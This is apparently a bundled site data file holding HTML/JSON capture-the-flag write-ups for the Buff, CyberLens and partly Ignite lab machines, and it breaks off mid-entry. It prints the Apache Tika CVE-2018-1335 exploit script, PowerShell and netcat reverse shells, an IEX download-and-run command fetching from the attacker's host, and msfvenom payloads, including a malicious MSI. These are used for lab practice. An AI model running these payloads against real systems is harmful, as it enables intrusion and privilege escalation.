remote: note_to_jake.txt<br>229 Entering Extended Passive Mode (|||28003|)<br>150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).<br>100% |*************************************************************************************************|   119        2.52 MiB/s    00:00 ETA<br>226 Transfer complete.<br>119 bytes received in 00:00 (1.65 KiB/s)<br></pre></p>","<p>The note advises changing the password and additionally leaks another user name.</p>","<p><pre>From Amy,<br>Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine</pre></p>","<p>At this point, there is nothing to do here in the FTP service, and I will skip for now the SSH service, as bruteforcing the SSH password is not always the right solution most of the time. So my strategy here will be to check the website first.</p>"]},{"id":"HTTP Enumeration","title":"<hr><h1><span style=\\"color:#da1953\\">HTT</span>P Enumeration</h1>","body":["asd"]}]}]}')},5310:e=>{"use strict";e.exports=JSON.parse('{"note":"title must match route name in App.js","title":"Buff","path":"buff","tags":["easy","ctf","box","htb","web","cms","powershell","iwr","python webserver","apache 2.4.43","chisel","cloudme 1.11.2","curl","download file","nsfvenom","port forwarding","powershell iwr","windows","winpeas","Gym Manager 1.0","privesc"],"date":"APR 2022","location":"./writeup/","banner":"writeup/buff/banner.gif","type":"writeup","search":[{"section":"Scanning","description":"Scanning Windows box with port 80 exposed, hosting website built with Gym Manager vulnerable to CVE giving access to the machine. Machine is vulnerable due to CLoudMe process not update."},{"section":"Exploiting Gym Manager","description":"Indentified the Gym Manager CVE with RCE - Remote Code Execution gave me a remote shell"},{"section":"Exploiting Gym Manager","description":"Downloaded NC - Netcat using pyhton web server and the Windows PowerShell iwr command and upgraded to a reverse shell. Alternatively, curl can also be used on this system."},{"section":"Exploiting Gym Manager","description":"Opened NC - Netcat listener to upgrade the shell"},{"section":"Search vulnerable process","description":"Searched for vulnerable process obtained with winpeas and found vulnerable CloudMe process"},{"section":"Port Forwarding","description":"Employing port forwarding with Chisel to execute CVE in Python from Kali"},{"section":"Exploitation","description":"Privilege escalation using nsfvenom generated shellcode for the CVE"}],"body":[{"id":"Ignite","title":"<h1> <span style=\\"color:#da1953\\">Ign</span>ite</h1><hr>","body":[{"id":"banner","title":"","body":["<img src=\\"/cyber/writeup/buff/banner.gif\\" alt=\\"\\">"]},{"id":"Scanning","title":"<hr><h1><span style=\\"color:#da1953\\">Sca</span>nning</h1><hr>","body":["<br><pre>PORT     STATE SERVICE    VERSION<br>7680/tcp open  pando-pub?<br>8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)</pre><br>"]},{"id":"Exploiting Gym Manager","title":"<h1><span style=\\"color:#da1953\\">Exp</span>loiting Gym Manager</h1>","body":["<p>The scanning reveals that there is a webserver running on port 8080 so I go to check it hoping to find some interesting information. In the page <i>contact</i>there is a information about the sofware used to build the site which is<i>Gym Manager Software 1.0</i>.</p>","<p><img src=\\"/cyber/writeup/buff/394c824c975047da8772b922fcbc9b46.png\\"></p>","<p>Searching a vulnerability or and exploit for, leads me to <a data-from-md title=\'https://www.exploit-db.com/exploits/48506\' href=\'https://www.exploit-db.com/exploits/48506\'>https://www.exploit-db.com/exploits/48506</a>. Then I donwloaded and run it as <code>python 48506.py http://10.10.10.198:8080/</code> and it ended up exploiting the software and giving me a shell. I can\'t do much with this shell, I cant change directory or do any other stuff so I need to upgrade the shell.</p>","<p>In order to do so I decided to download Netcat (nc) to the server and it includes a few steps:</p>","<ol><li>Open a web server in my Kali inside my Buff folder that I created to solve the box where I have all the exploits and programs <code>sudo python3 -m http.server 8080</code><br> <img src=\\"/cyber/writeup/buff/56bd6f9c0943430d9b1e04b84c11a092.png\\"></li><li>From the box I can connect to the Python HTTP server and download files, to do that there are two ways:<ol><li><code>powershell iwr http://10.10.14.197:8080:/nc.exe -outf nc.exe</code></li><li><code>curl http://10.10.14.197:8080/nc.exe -o nc.exe</code><br><img src=\\"/cyber/writeup/buff/a9274a65c7384c498436604953f1e81e.png\\"><br>In the directory, there are also other users artefacts.</li></ol></li></ol>","<p>Once Downloaded I open a listener on my Kali <code>nc -lvp 4444</code> and a client on the box in a way that upon connecting it will execute a command <code>nc.exe 10.10.14.197 4444 -e cmd.exe</code> it will result in having a command of the box on my kali machine.</p>","<img src=\\"/cyber/writeup/buff/bf06f1f38deb40e19379033fd6329abe.png\\"><br>"]},{"id":"User Flag","title":"<h1><span style=\\"color:#da1953\\">Use</span>r flag</h1>","body":["<p>Once got the shell I can move to the location of the user flag</p>","<img src=\\"/cyber/writeup/buff/ff20b0d447b54c38909325cbea503bca.png\\"><br>"]},{"id":"Priviledge escalation","title":"<h1><span style=\\"color:#da1953\\">Pri</span>viledge escalation</h1>","body":[{"id":"Search vulnerable process","title":"<h2>Search vulnerable process</h2>","body":["<p>To search a vulnerable process its possible to use <code>winpeas.exe</code> but in my case I checked one by one and search for them on google to see which one is vulnerable and I ended up finding <code>CloudMe.exe</code>.</p>","<p>Searching for an exploit I ended up finding many and various versions of Cloudme’s version.</p>"]},{"id":"Finding CloudMe Version","title":"<h2>Finding CloudMe Version</h2>","body":["<p>While I don\'t have administrator privilege I can\'t see the version of the program with <code>tasklist</code> or <code>Get-Proces</code> so I had to look around to see if I find something. In the end, the executable was in the <code>Shaun</code> user’s Download folder, which contains also the version number in the name.<br>","<img src=\\"/cyber/writeup/buff/3b6f506a74344ceabfef62b8cdacb5a5.png\\"><br>"]},{"id":"Port Forwarding","title":"<h2>Port Forwarding</h2>","body":["<p>I noticed that CloudMe runs on localhost port 8888 so there is no chance that I can remotely exploit it and neither locally because the script is in Python and it is not installed in the box. So I used <b>Chisel</b> to forward the connection. I had to donwload a precompiled version for Windows and Linux from <a data-from-md title=\'https://github.com/jpillora/chisel/releases/\' href=\'https://github.com/jpillora/chisel/releases/\'>https://github.com/jpillora/chisel/releases/</a>. I loaded Chisel in the box in the same way as Netcat. From my Kali machine, I opened a server as shown in <a data-from-md title=\'https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html\' href=\'https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html\'>https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html</a><br> <code>./chisel server -p 7777 --reverse</code> and a client in the box as <code>chisel client 10.10.14.187:7777 R:8888:127.0.0.1:8888</code><br>","<img src=\\"/cyber/writeup/buff/18cc7f4ffbdb4c4a97f31ff0a6bdc1f0.png\\"><br>"]},{"id":"Exploitation","title":"<h2>Exploitation</h2>","body":["<p>Now my choice of exploit comes down to four possibilities.</p>","<p><img src=\\"/cyber/writeup/buff/dce0e1743ade4d6cbee6d9b255793b64.png\\"></p>","<p>And I chose the PoC one.</p>","After opening the exploit it suggested a command line to enumerate a shellcode, so I generated a shellcode that I needed in order to exploit CloudMe and give a reverse shell. <code>msfvenom -a x86 -p windows/exec CMD=\'C:\\\\xampp\\\\htdocs\\\\gym\\\\upload\\nc.exe 10.10.14.197 1111 -e cmd.exe\' -b \'\\\\x00\\\\x0A\\\\x0D\' -f python</code> Now I have replaced the new shell code with the old one inside the script. Once exploited the CloudMe, it will invoke <b>nc.exe</b> and try to connect to my Kali machine so before that I have to listen in port 1111. And run the exploit from another shell.<br>","<p><img src=\\"/cyber/writeup/buff/9f79a8643caa4742af026633b9a6cad5.png\\"></p>","<p>The root flag in on the administrator desktop.</p>"]}]}]}]}')},1107:e=>{"use strict";e.exports=JSON.parse('{"note":"title must match route name in App.js","title":"Cyber Lens","path":"cyber-lens","tags":["easy","box","oscp","thm","web","nsfvenom","windows","privesc","nc","rce","reverse shell","apache tika 1.17","cve","curl","download file","http 80","iex","powershell","powershell iex","python web server","windows","winpeas","windows base64 encoding","msi installer reveshe shell"],"date":"FEB 2025","location":"./writeup/","banner":"writeup/cyberlens/banner.gif","type":"writeup","search":[{"section":"Scanning","description":"Scanning with nmap and finding the host exposing posts 80 http, 135 msrpc, 139 netbios-ssn, 445 microsoft-ds? and 3389 ms-wbt-server Microsoft Terminal Services (rdp)"},{"section":"Web enumeration","description":"Enumerating website to find javascript containing hidden endpoint and port"},{"section":"Web enumeration","description":"Enumerating website to find web server name and version (Apache Tika 1.17)"},{"section":"Web enumeration","description":"Adding domain in /etc/hosts matching target IP address"},{"section":"Web enumeration","description":"Searchin public exploit for Apache Tika 1.17 with searchsploit from command line"},{"section":"Remote code execution (RCE)","description":"Proof of cconcept (poc) of remote code execution (rce) via public exploit from searchsploit"},{"section":"Shell as CyberLens","description":"Selecting the Powershell reverse shell and saving with .ps1 extenxtion"},{"section":"Shell as CyberLens","description":"Encoding in Base64 the powershell command IEX to download and excete the file, and giving the encoded command as a paramter to the exploit"},{"section":"Shell as CyberLens","description":"Opening a python web server to download the reverse shell in the target machine via the exploit\'s remote code execution"},{"section":"Shell as CyberLens","description":"Listening with Netcat to receive the remote shell (user)"},{"section":"Enumeration","description":"Enumerating Windows user files to find Remote Desktop Protocol (RDP) credentials"},{"section":"Enumeration","description":"Connecting to the target machine via xfreerdp with the found credentials in the previews step"},{"section":"Privilege escalation","description":"Downloading WinPeas by copy/pasting the raw code from GitHub and saving it with .bat extension"},{"section":"Privilege escalation","description":"Finding Windows missconfiguration, AlwaysInstallElevated set to 1, leading to privilege escalation via msi installation file"},{"section":"Privilege escalation","description":"Creating malicious msi installer with msfvenom for reverse shell with elevated privileges"},{"section":"Privilege escalation","description":"Donwloading the malicious msi file with Python web server (Kali), executing the malicious installer (target), and receiving the revershe shell with elevated privilege in the listening Netcat session (Kali)"}],"body":[{"id":"CyberLens","title":"<h1> <span style=\\"color:#da1953\\">Cyb</span>er Lens</h1><hr>","body":[{"id":"banner","title":"","body":["<img src=\\"/cyber/writeup/cyberlens/banner.gif\\" alt=\\"\\">"]},{"id":"Scanning","title":"<hr><h1><span style=\\"color:#da1953\\">Sca</span>nning</h1>","body":["<p><pre># Nmap 7.94SVN scan initiated Mon Feb 17 08:13:49 2025 as: nmap -sC -sV -oN nmap 10.10.182.183<br>Nmap scan report for cyberlens.thm (10.10.182.183)<br>Host is up (0.051s latency).<br>Not shown: 995 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE       VERSION<br>80/tcp   open  http          Apache httpd 2.4.57 ((Win64))<br>|_http-server-header: Apache/2.4.57 (Win64)<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>|_http-title: CyberLens: Unveiling the Hidden Matrix<br>135/tcp  open  msrpc         Microsoft Windows RPC<br>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn<br>445/tcp  open  microsoft-ds?<br>3389/tcp open  ms-wbt-server Microsoft Terminal Services<br>| rdp-ntlm-info: <br>|   Target_Name: CYBERLENS<br>|   NetBIOS_Domain_Name: CYBERLENS<br>|   NetBIOS_Computer_Name: CYBERLENS<br>|   DNS_Domain_Name: CyberLens<br>|   DNS_Computer_Name: CyberLens<br>|   Product_Version: 10.0.17763<br>|_  System_Time: 2025-02-17T13:14:12+00:00<br>| ssl-cert: Subject: commonName=CyberLens<br>| Not valid before: 2025-02-16T12:31:00<br>|_Not valid after:  2025-08-18T12:31:00<br>|_ssl-date: 2025-02-17T13:14:23+00:00; 0s from scanner time.<br>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-security-mode: <br>|   3:1:1: <br>|_    Message signing enabled but not required<br>| smb2-time: <br>|   date: 2025-02-17T13:14:14<br>|_  start_date: N/A<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br># Nmap done at Mon Feb 17 08:14:24 2025 -- 1 IP address (1 host up) scanned in 34.99 seconds</pre></p>","<p>I have 5 ports: 80 http, 135 msrpc, 139 netbios-ssn, 445 microsoft-ds? and 3389 ms-wbt-server.</p>","<p>Now during the challenge, I did not know much about the Windows environment and with the help of ChatGPT I searched and learned each of the ports I did not know about because each of them could be an attack vector or be used during the exploitation process in a way or another.</p>"]},{"id":"Web enumeration","title":"<h1><span style=\\"color:#da1953\\">Web</span> enumeration</h1>","body":["<p>I started my enumeration process with the website, and it seems pretty basic with a functionality to extract metadata from an uploaded image.</p>","<p><img src=\\"/cyber/writeup/cyberlens/websitehome1.PNG\\" alt=\\"\\"></p>","<p><img src=\\"/cyber/writeup/cyberlens/websitehome2.PNG\\" alt=\\"\\"></p>","<p>The next thing is to upload a random image and see how the function extracts the metadata. The function generated a long output but nothing interesting in the image metadata as I uploaded a random image.</p>","<p><img src=\\"/cyber/writeup/cyberlens/metadata.PNG\\" alt=\\"\\"></p>","<p>Now I want to understand how the function works starting looking for the function from the source code.</p>","<p>Analyzing the page source I can clearly see the script and the endpoint it is contacting to examine the image metadata.</p>","<p><img src=\\"/cyber/writeup/cyberlens/script.PNG\\" alt=\\"\\"></p>","<p><pre>document.addEventListener(\\"DOMContentLoaded\\", function() {<br>  document.getElementById(\\"metadataButton\\").addEventListener(\\"click\\", function() {<br>    var fileInput = document.getElementById(\\"imageFileInput\\");<br>    var file = fileInput.files[0];<br><br>    var reader = new FileReader();<br>    reader.onload = function() {<br>      var fileData = reader.result;<br><br>      fetch(\\"http://cyberlens.thm:61777/meta\\", {<br>        method: \\"PUT\\",<br>        body: fileData,<br>        headers: {<br>          \\"Accept\\": \\"application/json\\",<br>          \\"Content-Type\\": \\"application/octet-stream\\"<br>        }<br>      })<br>      .then(response => {<br>        if (response.ok) {<br>          return response.json();<br>        } else {<br>          throw new Error(\\"Error: \\" + response.status);<br>        }<br>      })<br>      .then(data => {<br>        var metadataOutput = document.getElementById(\\"metadataOutput\\");<br>        metadataOutput.innerText = JSON.stringify(data, null, 2);<br>      })<br>      .catch(error => {<br>        console.error(\\"Error:\\", error);<br>      });<br>    };<br><br>    reader.readAsArrayBuffer(file);<br>  });<br>});</pre></p>","The endpoint is <code>http://cyberlens.thm:61777/</code> and to access this endpoint I have to update my <code>/etc/hosts</code> file.","<p><pre>127.0.0.1      localhost<br>127.0.1.1      kali<br>10.10.158.180  cyberlens.thm<br># The following lines are desirable for IPv6 capable hosts<br>::1     localhost ip6-localhost ip6-loopback<br>ff02::1 ip6-allnodes<br>ff02::2 ip6-allrouters</pre></p>","<p>By visiting the URL I can see all the methods, the server name and the version. </p>","<p><img src=\\"/cyber/writeup/cyberlens/apachetika.PNG\\" alt=\\"\\"></p>","<p>By searching the server name and the version in searchsploit a CVE pops up.</p>","<p><pre>$ searchsploit apache tika 1.17<br>----------------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                                     |  Path<br>----------------------------------------------------------------------------------- ---------------------------------<br>Apache Tika 1.15 - 1.17 - Header Command Injection (Metasploit)                    | windows/remote/47208.rb<br>Apache Tika-server < 1.18 - Command Injection                                      | windows/remote/46540.py<br>----------------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results</pre></p>","<p>Here my first choice is the <b>46540.py</b> because it is Python and it is not a Metasploit module meaning I can use it almost out of the box.</p>"]},{"id":"Remote code execution (RCE)","title":"<h1><span style=\\"color:#da1953\\">Rem</span>ote code execution (RCE)</h1>","body":["<p><pre class=\\"python-code\\">######################################################################################################<br>#<span class=\\"string\\">Description:</span> This is a PoC for remote command execution in Apache Tika-server.<br>#<span class=\\"string\\">Versions Affected:</span> Tika-server versions &lt; 1.18<br>#<span class=\\"string\\">Researcher:</span> David Yesland Twitter: @Daveysec<br>#<span class=\\"string\\">Blog Link:</span> https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika<br>#<span class=\\"string\\">NIST CVE Link:</span> https://nvd.nist.gov/vuln/detail/CVE-2018-1335<br>######################################################################################################<br><br><span class=\\"keyword\\">import</span> sys<br><span class=\\"keyword\\">import</span> requests<br><br><span class=\\"keyword\\">if</span> len(sys.argv) &lt; 4:<br>    <span class=\\"function\\">print</span> <span class=\\"string\\">\\"Usage: python CVE-2018-1335.py &lt;host&gt; &lt;port&gt; &lt;command&gt;\\"</span><br>    <span class=\\"function\\">print</span> <span class=\\"string\\">\\"Example: python CVE-2018-1335.py localhost 9998 calc.exe\\"</span><br><span class=\\"keyword\\">else</span>:<br>    host = sys.argv[1]<br>    port = sys.argv[2]<br>    cmd = sys.argv[3]<br><br>    url = host + <span class=\\"function\\">str</span>(port) + <span class=\\"string\\">\\"/meta\\"</span><br><br>    headers = {<span class=\\"string\\">\\"X-Tika-OCRTesseractPath\\"</span>: <span class=\\"string\\">\\"\\"cscript\\"\\"</span>,<br>               <span class=\\"string\\">\\"X-Tika-OCRLanguage\\"</span>: <span class=\\"string\\">\\"//E:Jscript\\"</span>,<br>               <span class=\\"string\\">\\"Expect\\"</span>: <span class=\\"string\\">\\"100-continue\\"</span>,<br>               <span class=\\"string\\">\\"Content-type\\"</span>: <span class=\\"string\\">\\"image/jp2\\"</span>,<br>               <span class=\\"string\\">\\"Connection\\"</span>: <span class=\\"string\\">\\"close\\"</span>}<br><br>    jscript = <span class=\\"string\\">\'\'\'var oShell = WScript.CreateObject(\\"WScript.Shell\\");<br>    var oExec = oShell.Exec(\'cmd /c {}\');\'\'\'</span>.format(cmd)<br><br>    <span class=\\"keyword\\">try</span>:<br>        requests.put(<span class=\\"string\\">\\"https://\\"</span> + url, headers=headers, data=jscript, verify=False)<br>    <span class=\\"keyword\\">except</span>:<br>        <span class=\\"keyword\\">try</span>:<br>            requests.put(<span class=\\"string\\">\\"http://\\"</span> + url, headers=headers, data=jscript)<br>        <span class=\\"keyword\\">except</span>:<br>            <span class=\\"function\\">print</span> <span class=\\"string\\">\\"Something went wrong. Usage: python CVE-2018-1335.py &lt;host&gt; &lt;port&gt; &lt;command&gt;\\"</span><br></pre></p>","<p>The exploit is pretty simple to understand, what it needs is just the remote host remote port and the command to execute. I will test it by executing a simple command such as <code>dir</code>. Note that the sccript is written in Python2 so make sure to user that version of Python and give execution permission ot the ascript. <code>chmod +x 46540.py</code></p>","<p>After executing the command <code>$ python2 46540.py cyberlens.thm 61777 dir</code> I did not receive any response from the server. This makes me think that the code runs but the output is not reported to me. I can test if the code is successfully executed by trying to download a file from my Kali box. The idea behind this is that if my webserver receives a connection from that target host it means the code was successfully executed. To test this I will use the command <code>curl</code>.</p>","<p><img src=\\"/cyber/writeup/cyberlens/rce.PNG\\" alt=\\"\\"></p>","<p>Here I can clearly see the successful execution of the code as I received the connection back from the target machine to my webserver. Now I have to craft a payload to get a reverse shell.</p>"]},{"id":"Shell as CyberLens","title":"<h1><span style=\\"color:#da1953\\">Shel</span>l as CyberLens</h1>","body":["<p>The idea here is to give a command to receive a reverse shell, but if I write directly the reverse shell in the following way:</p>","<p><pre>$ python2 cyberlens.thm 61777 \'powershell -c \\"New-Object System.Net.Sockets.TCPClient(\\"10.0.2.4\\",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \\"PS \\" + (pwd).Path + \\"> \\";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\\"\'</pre></p>","<p>This gives errors as there is a mix of single and double quotes messing up with the most external single quotes which encloses the powershell command. I also tried to encode the code in Base64 in the following way, and it was also giving me erorrs due to the mixture of single and double quotes.</p>","<p><pre class=\\"powershell-code\\"><span class=\\"variable\\">$Text</span> = <span class=\\"string\\">\'Code to encode\'</span><br><span class=\\"variable\\">$Bytes</span> = [<span class=\\"type\\">System.Text.Encoding</span>]::<span class=\\"method\\">Unicode.GetBytes</span>(<span class=\\"variable\\">$Text</span>)<br><span class=\\"variable\\">$EncodedText</span> = [<span class=\\"cmdlet\\">Convert</span>]::<span class=\\"method\\">ToBase64String</span>(<span class=\\"variable\\">$Bytes</span>)<br><span class=\\"variable\\">$EncodedText</span><br></pre></p>","The second Idea is to download and execute a Powershell script containing the reverse shell. I will use the following reverse shell names <b>rev.ps1</b>. Change the IP and PORT accordingly.","<p><pre class=\\"powershell-code\\"><span class=\\"variable\\">$client</span> = <span class=\\"cmdlet\\">New-Object</span> <span class=\\"type\\">System.Net.Sockets.TCPClient</span>(\\"10.10.14.84\\", 4444);<br><span class=\\"variable\\">$stream</span> = <span class=\\"variable\\">$client</span>.<span class=\\"method\\">GetStream</span>();<br><span class=\\"type\\">[byte[]]</span><span class=\\"variable\\">$bytes</span> = 0..65535 | <span class=\\"cmdlet\\">%</span>{0};<br><span class=\\"keyword\\">while</span>(<span class=\\"condition\\">($i = $stream.Read($bytes, 0, $bytes.Length))</span> -ne 0) {<br>    <span class=\\"variable\\">$data</span> = (<span class=\\"cmdlet\\">New-Object</span> -<span class=\\"parameter\\">TypeName</span> <span class=\\"type\\">System.Text.ASCIIEncoding</span>).<span class=\\"method\\">GetString</span>($bytes, 0, $i);<br>    <span class=\\"variable\\">$sendback</span> = (<span class=\\"cmdlet\\">iex</span> <span class=\\"variable\\">$data</span> 2>&1 | <span class=\\"cmdlet\\">Out-String</span>);<br>    <span class=\\"variable\\">$sendback2</span> = <span class=\\"variable\\">$sendback</span> + \\"# \\";<br>    <span class=\\"variable\\">$sendbyte</span> = ([text.encoding]::ASCII).<span class=\\"method\\">GetBytes</span>(<span class=\\"variable\\">$sendback2</span>);<br>    <span class=\\"variable\\">$stream</span>.<span class=\\"method\\">Write</span>($sendbyte, 0, $sendbyte.Length);<br>    <span class=\\"variable\\">$stream</span>.<span class=\\"method\\">Flush</span>();<br>}<br><span class=\\"variable\\">$client</span>.<span class=\\"method\\">Close</span>();</pre></p>","To download and run the script I have to execute the following command: <code>python2 46540.py cyberlens.thm 61777 \'powershell -command \\"IEX(New-Object Net.WebClient).downloadString(\'http://10.21.112.161:8000/rev.ps1\')\\"</code>. To avoid any error I will encode the Powershell command in Base64.","<p><pre class=\\"powershell-code\\"><span class=\\"variable\\">$payload</span> = <span class=\\"string\\">\\"IEX(New-Object Net.WebClient).downloadString(\'http://10.21.112.161:8000/rev.ps1\')\\"</span><br><span class=\\"variable\\">$Bytes</span> = [<span class=\\"type\\">System.Text.Encoding</span>]::<span class=\\"method\\">Unicode.GetBytes</span>(<span class=\\"variable\\">$payload</span>)<br><span class=\\"variable\\">$EncodedText</span> = [<span class=\\"cmdlet\\">Convert</span>]::<span class=\\"method\\">ToBase64String</span>(<span class=\\"variable\\">$Bytes</span>)<br><span class=\\"variable\\">$EncodedText</span><br>SQBFAFgAKABOA[...REDACTED...]gBlAHYALgBwAHMAMQAnACkA<br></pre></p>","<p><img src=\\"/cyber/writeup/cyberlens/revshell.PNG\\" alt=\\"\\"></p>","<p>Navigatin to the Desktop of the current user I can find the flag.</p>","<p><pre>$ nc -lvnp 4444<br>listening on [any] 4444 ...<br>connect to [10.21.112.161] from (UNKNOWN) [10.10.133.177] 49860<br><br>C:\\\\Windows\\\\system32> cd C:/<br>C:\\\\> cd /Users<br>C:\\\\Users> cd CyberLens/Desktop<br>C:\\\\Users\\\\CyberLens\\\\Desktop> dir<br><br><br>    Directory: C:\\\\Users\\\\CyberLens\\\\Desktop<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br>----                -------------         ------ ----                                                                  <br>-a----        6/21/2016   3:36 PM            527 EC2 Feedback.website                                                  <br>-a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website                                   <br>-a----         6/6/2023   7:54 PM             25 user.txt                                                              <br><br><br>C:\\\\Users\\\\CyberLens\\\\Desktop> type user.txt<br>THM{T1k4-CV3-f0r-7h3-w1n}</pre></p>","<p>The next step is to do privilege escalation.</p>"]},{"id":"Enumeration","title":"<h1><span style=\\"color:#da1953\\">Enu</span>meration</h1>","body":["<p>One trick that I learnt from a friend of mine is the command <b>tree</b>. I use this command all the time for my personal use. I\'m not sure why didn\'t I think earlier, it is so helpful and makes the search easy and easy to visualise all the files.</p>","<p><pre>$ nc -lvnp 4444<br>listening on [any] 4444 ...<br>connect to [10.21.112.161] from (UNKNOWN) [10.10.77.142] 49757<br><br>C:\\\\Windows\\\\system32> cd C:/Users<br>C:\\\\Users> tree /f<br>Folder PATH listing<br>Volume serial number is A8A4-C362<br>C:.<br>????Administrator<br>????CyberLens<br>?   ????3D Objects<br>?   ????Contacts<br>?   ????Desktop<br>?   ?       EC2 Feedback.website<br>?   ?       EC2 Microsoft Windows Guide.website<br>?   ?       user.txt<br>?   ?       <br>?   ????Documents<br>?   ?   ????Management<br>?   ?           CyberLens-Management.txt<br>?   ?           <br>?   ????Downloads<br>?   ????Favorites<br>?   ?   ?   Bing.url<br>?   ?   ?   <br>?   ?   ????Links<br>?   ????Links<br>?   ?       Desktop.lnk<br>?   ?       Downloads.lnk<br>?   ?       <br>?   ????Music<br>?   ????Pictures<br>?   ????Saved Games<br>?   ????Searches<br>?   ????Videos<br>????Public<br>    ????Documents<br>    ????Downloads<br>    ????Music<br>    ????Pictures<br>    ????Videos<br>C:\\\\Users> type CyberLens\\\\Documents\\\\Management\\\\CyberLens-Management.txt<br>Remember, manual enumeration is often key in an engagement ;)<br><br>CyberLens<br>HackSmarter123</pre></p>","<p>Listing the file structure the only interesting file is <i>CyberLens-Management.txt</i> which contains credentials. Thinking about the Nmap scan the only other service where I can use credentials is the Remote Desktop Protocol (RDP). The RDP program that I will use is <b>xfreerdp</b> but <b>remmina</b> is also a very good alternative that I love to use. <code>xfreerdp /u:CyberLens /p:HackSmarter123 /v:10.10.77.142 +clipboard</code></p>","<p><img src=\\"/cyber/writeup/cyberlens/rdp.PNG\\" alt=\\"\\"></p>"]},{"id":"Privilege escalation","title":"<h1><span style=\\"color:#da1953\\">Pri</span>vilege escalation</h1>","body":["<p>For the privilege escalation, I used <a href=\\"https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS\\">WinPeas</a>, I copied the raw text from <a href=\\"https://raw.githubusercontent.com/peass-ng/PEASS-ng/refs/heads/master/winPEAS/winPEASbat/winPEAS.bat\\">GitHub</a> and pasted it into the note saving it with the .bat extension.</p>","<p><img src=\\"/cyber/writeup/cyberlens/winpeassave.PNG\\" alt=\\"\\"></p>","<p>I run the script from Powershell, I prefer it as it has a maller font.</p>","<p><img src=\\"/cyber/writeup/cyberlens/wpexec.PNG\\" alt=\\"\\"></p>","<p>After spending some time, analysing the output, testing things and failing  I found a misconfiguration.</p>","<p><img src=\\"/cyber/writeup/cyberlens/missconf.PNG\\" alt=\\"\\"></p>","<p>You can find more tails about this vulneability on <a href=\\"https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/AlwaysInstallElevated.md\\">GitHub</a>.</p>","<p><blockquote>\\"AlwaysInstallElevated\\" is a Windows Registry setting that affects the behavior of the Windows Installer service. The vulnerability arises when the \\"AlwaysInstallElevated\\" registry key is configured with a value of \\"1\\" in the Windows Registry.</p><p>When this registry key is enabled, it allows non-administrator users to install software packages with elevated privileges. In other words, users who shouldn\'t have administrative rights can exploit this vulnerability to execute arbitrary code with elevated permissions, potentially compromising the security of the system.</blockquote></p>","<p>What the description is saying is that with that flag enabled the installation process of software is performed with high privileges even when the installation is launched by low-privileged accounts. Now it becomes clear that I have to create a malicious installation file with .msi extension to elevate my privileges.</p>","<p>To create a malicious Windows installation file I can use Msfvenom with the following command:</p>","<p><pre>$ msfvenom -p windows/shell_reverse_tcp lhost=10.21.112.161 lport=3333 -f msi > reverse.msi<br>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload<br>[-] No arch selected, selecting arch: x86 from the payload<br>No encoder specified, outputting raw payload<br>Payload size: 324 bytes<br>Final size of msi file: 159744 bytes</pre></p>","<p>The next step is to upload <b>reverse.msi</b> into the target Windows machine via a Python web server and the command <code>curl</code>.</p>","<p>First, I will open a Python webserver in the same forlder as the <b>reverse.msi</b>:</p>","<p><pre>$ python3 -m http.server<br>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...<br>10.10.232.185 - - [23/Feb/2025 06:36:44] \\"GET /reverse.msi HTTP/1.1\\" 200 -</pre></p>","<p>I will also open a Netcat listener on my Kali on port 3333, the same port as specified during the creation of the .msi file. <code>nc -lvnp 3333</code>.</p>","<p>Now from the target machine, I will download the file with <code>curl</code> and execute it.</p>","<p><pre>C:\\\\Users\\\\CyberLens>curl http://10.21.112.161:8000/reverse.msi --output reverse.msi<br>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current<br>                                 Dload  Upload   Total   Spent    Left  Speed<br>100  156k  100  156k    0     0   156k      0  0:00:01 --:--:--  0:00:01  369k</pre></p>","<p>Upon executing the installation file a warning message will be prompted, just press \\"ok\\" to receive the reverse shell on the listening Netcat session on port 3333 previously opened.</p>","<p><img src=\\"/cyber/writeup/cyberlens/execmsi.PNG\\" alt=\\"\\"></p>","<p><pre>$ nc -lvnp 3333<br>listening on [any] 3333 ...<br>connect to [10.21.112.161] from (UNKNOWN) [10.10.232.185] 49811<br>Microsoft Windows [Version 10.0.17763.1821]<br>(c) 2018 Microsoft Corporation. All rights reserved.<br><br>C:\\\\Windows\\\\system32>whoami<br>whoami<br>nt authority\\\\system<br><br>C:\\\\Users>cd Administrator<br>cd Administrator<br><br>C:\\\\Users\\\\Administrator>cd Desktop<br>cd Desktop<br><br>C:\\\\Users\\\\Administrator\\\\Desktop>type admin.txt<br>type admin.txt<br>THM{3lev@t3D-4-pr1v35c!}</pre></p>"]}]}]}')},1149:e=>{"use strict";e.exports=JSON.parse('{"note":"title must match route name in App.js","title":"Ignite","path":"ignite","tags":["easy","ctf","oscp","box","thm","web","cms","fuelcms","apache 2.4.18","reverse shell","rce","php","cve","http 80","linux","nc","upgrade shell","privesc"],"date":"JAN 2024","location":"./writeup/","banner":"writeup/ignite/banner.gif","type":"writeup","search":[{"section":"Scanning","description":"Nmap scan to find port 80 HTTP open, revealing robots.txt and "},{"section":"Web analysis (Rabbit 